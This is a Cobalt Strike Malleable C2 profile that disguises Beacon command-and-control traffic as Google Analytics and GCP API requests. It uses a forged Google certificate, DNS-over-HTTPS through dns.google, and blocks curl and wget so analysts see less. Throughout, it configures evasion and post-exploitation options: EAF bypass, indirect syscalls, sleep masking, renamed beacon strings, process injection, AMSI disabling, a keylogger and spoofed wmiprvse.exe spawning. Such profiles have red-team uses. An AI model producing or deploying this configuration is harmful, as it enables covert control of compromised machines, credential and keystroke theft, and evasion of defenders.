# Malleable C2 Profile - Google Analytics theme
# CS 4.13 / Beacon Booster compatible
# Sub-profile of reference_mod_413.profile (Azure Function redirector baseline)
# Simulates Google Analytics and GCP API traffic

# Various options

set sample_name "Google Analytics Beacon";
set data_jitter "64";
set host_stage "false";
set tasks_max_size "104857600";
set pipename "Winsock2\\CatalogChangeListener-###-0";
set pipename_stager "ntsvcs_###";
set smb_frame_header "";
set ssh_banner "OpenSSH_9.3p1 Debian-1";

set sleeptime "30000";
set jitter "42";

set killdate "20260916";

set ssh_pipename "gtag_ssh_####";
set tcp_frame_header "";
set tcp_port "8080";

set headers_remove "";

set steal_token_access_mask "11";

set tasks_proxy_max_size "94371840";

set tasks_dns_proxy_max_size "71680";

dns-beacon {
    set maxdns "255";
    set dns_idle "0.0.0.0";
    set dns_max_txt "252";
    set dns_sleep "0";
    set dns_stager_prepend "";
    set dns_stager_subhost ".api.947103.";
    set dns_ttl "1";

    set beacon         "api.bc.";
    set get_A          "api.1a.";
    set get_AAAA       "api.4a.";
    set get_TXT        "api.tx.";
    set put_metadata   "api.md.";
    set put_output     "api.po.";

    set ns_response "zero";

    set comm_mode "dns-over-https";
    dns-over-https {
        set doh_verb           "POST";
        set doh_useragent      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36";
        set doh_proxy_server   "";
        set doh_server         "dns.google";
        set doh_accept         "application/dns-message";
        header "Content-Type"  "application/dns-message";
    }
}

http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "gws";
    header "Keep-Alive" "timeout=10, max=200";
    header "Connection" "Keep-Alive";
    set trust_x_forwarded_for "true";
    set block_useragents "curl*,lynx*,wget*";
    set allow_useragents "";
}

https-certificate {
    set C "US";
    set CN "*.googleapis.com";
    set L "Mountain View";
    set OU "Google Cloud";
    set O "Google LLC";
    set ST "CA";
    set validity "365";
}

http-stager {
    set uri_x86 "/collect";
    set uri_x64 "/j/collect";

    client {
        parameter "v" "1";
        parameter "tid" "UA-68382047-2";
        parameter "cid" "555";
    }

    server {
        header "Content-Type" "image/gif";
        header "Cache-Control" "no-cache, no-store, must-revalidate";
        header "X-Content-Type-Options" "nosniff";
        output {
            # GIF89a header
            prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b";
            print;
        }
    }
}

# Modern Chrome on Windows 10/11
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36";

# GET - mimics Google Analytics collection endpoint
http-get {
    set uri "/__utm.gif";

    client {
        header "Accept" "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Sec-Fetch-Site" "cross-site";
        header "Sec-Fetch-Mode" "no-cors";
        header "Sec-Fetch-Dest" "image";

        metadata {
            mask;
            netbios;
            prepend "SESSIONID=";
            header "Cookie";
        }

        parameter "utmac" "UA-68382047-2";
        parameter "utmcn" "1";
        parameter "utmcs" "ISO-8859-1";
        parameter "utmsr" "1920x1080";
        parameter "utmsc" "24-bit";
    }

    server {
        header "Content-Type" "image/gif";
        header "Cache-Control" "private, no-cache, no-cache=Set-Cookie, proxy-revalidate";
        header "X-Content-Type-Options" "nosniff";

        output {
            mask;
            base64;
            # GIF89a wrapper
            prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00";
            append "\x3b";
            print;
        }
    }
}

# POST - mimics GCP API endpoint
http-post {
    set uri "/batch/analytics/v1";
    set verb "POST";
    set client_max_post_get_packet "4096";

    client {
        header "Content-Type" "application/json; charset=utf-8";
        header "Accept" "application/json";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Sec-Fetch-Site" "same-origin";
        header "Sec-Fetch-Mode" "cors";

        output {
            mask;
            base64url;
            uri-append;
        }

        id {
            mask;
            base64url;
            prepend "{\"clientId\":\"";
            append "\",\"events\":[{\"name\":\"page_view\"}]}\n";
            print;
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "X-Content-Type-Options" "nosniff";
        header "Alt-Svc" "h3=\":443\"; ma=2592000,h3-29=\":443\"; ma=2592000";

        output {
            mask;
            base64;
            prepend "{\"kind\":\"analytics#data\",\"totalResults\":1,\"rows\":[[\"";
            append "\"]]}\n";
            print;
        }
    }
}

http-beacon {
    set library "winhttp";
    set data_required "true";
    set data_required_length "256-512";
}

# ------------------------------------------------------------
# BASELINE HARDENING - matches reference_mod_413.profile
# See references/profile-baseline.md before editing.
# ------------------------------------------------------------

stage {

    set checksum "0";
    set data_store_size "16";

    set copy_pe_header         "true";
    set eaf_bypass             "true";
    set rdll_use_syscalls      "true";
    set rdll_use_driploading   "true";
    set rdll_dripload_delay    "100";

    # Beacon Booster compatible: no transform-obfuscate, no prepend/append in stage transforms

    # Separation knob: theme-matching strrep replacements
    transform-x86 {
        strrep "ReflectiveLoader" "CatalogUpdate";
        strrep "beacon.x64.dll" "corelib.dll";
        strrep "beacon.dll" "gacutil.dl";
    }

    transform-x64 {
        strrep "ReflectiveLoader" "CatalogUpdate";
        strrep "beacon.x64.dll" "corelib.dll";
        strrep "beacon.dll" "gacutil.dl";
    }

    # Separation knob: theme-matching decoy string
    stringw "Google Analytics Beacon";

    set allocator "VirtualAlloc";
    set cleanup "true";
    set magic_pe "PE";
    set obfuscate "true";
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
      All;
    }

    set stomppe "true";
    set userwx "false";

    # Separation knobs: varied per profile
    set compile_time "25 Mar 2024 14:22:00";
    set entry_point "81440";

}

process-inject {

    set allocator "VirtualAllocEx";
    set use_driploading   "true";
    set dripload_delay    "100";

    set min_alloc "16384";
    set startrwx "false";
    set userwx "false";

    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";

    # Separation knob: 2 NOPs (baseline)
    transform-x86 {
        prepend "\x90\x90";
    }

    transform-x64 {
    }

    execute {
        ObfSetThreadContext;
        CreateThread "ntdll.dll!RtlUserThreadStart";
        SetThreadContext;
        NtQueueApcThread-s;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

post-ex {
    # Separation knob: unique spawnto per profile
    set spawnto_x86 "%windir%\\syswow64\\wmiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wmiprvse.exe -Embedding";

    set obfuscate "true";

    # Separation knob: unique post-ex pipe per profile
    set pipename "chrome_###, chrome.####.###.#";

    set smartinject "true";
    set amsi_disable "true";
    set keylogger "GetAsyncKeyState";
    set cleanup "true";

    transform-x64 {
        strrepex "PortScanner" "Scanner module is complete" "Scan done";
        strrep "is alive." "is up.";
    }

    transform-x86 {
        strrepex "PortScanner" "Scanner module is complete" "Scan done";
        strrep "is alive." "is up.";
    }
}
